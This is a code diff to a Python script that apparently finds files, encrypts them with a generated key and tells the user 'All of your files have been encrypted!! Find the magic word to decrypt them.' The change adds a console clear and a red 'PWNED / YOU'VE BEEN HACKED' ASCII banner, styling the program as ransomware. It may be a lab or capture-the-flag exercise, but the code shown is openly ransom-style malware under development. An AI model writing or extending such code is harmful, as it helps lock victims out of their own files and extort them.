@@ -28,11 +28,42 @@ def encrypt_files(files, key):
             f.write(encrypted_data)
     logging.info(f"Encrypted Files: {files}")
 
+def dramatic_banner():
+    """Prints a dramatic ASCII banner and changes console color."""
+    # Change color of the console output to be more dramatic (Red)
+    print("\033[91m")  # ANSI escape code for red
+
+    print("All of your files have been encrypted!! Find the magic word to decrypt them.")
+
+    # Print a big emoticon (ASCII art) to emphasize being 'hacked'.
+    print(r"""
+        
+        ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ██╗
+        ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗██║
+        ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║██║
+        ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║╚═╝
+        ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝██╗
+        ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ ╚═╝
+                                               
+         Y O U ' V E   B E E N   H A C K E D !
+    """)
+
+    # Reset the color
+    print("\033[0m")
+
+def clear_console():
+    """Clear the console screen on Windows or Unix-like systems."""
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
 def main():
+    clear_console()
     files = find_files()
     key = generate_key()
     encrypt_files(files, key)
-    print("All of your files have been encrypted!! Find the magic word to decrypt them.")
+    dramatic_banner()
 
 if __name__ == "__main__":
     main()
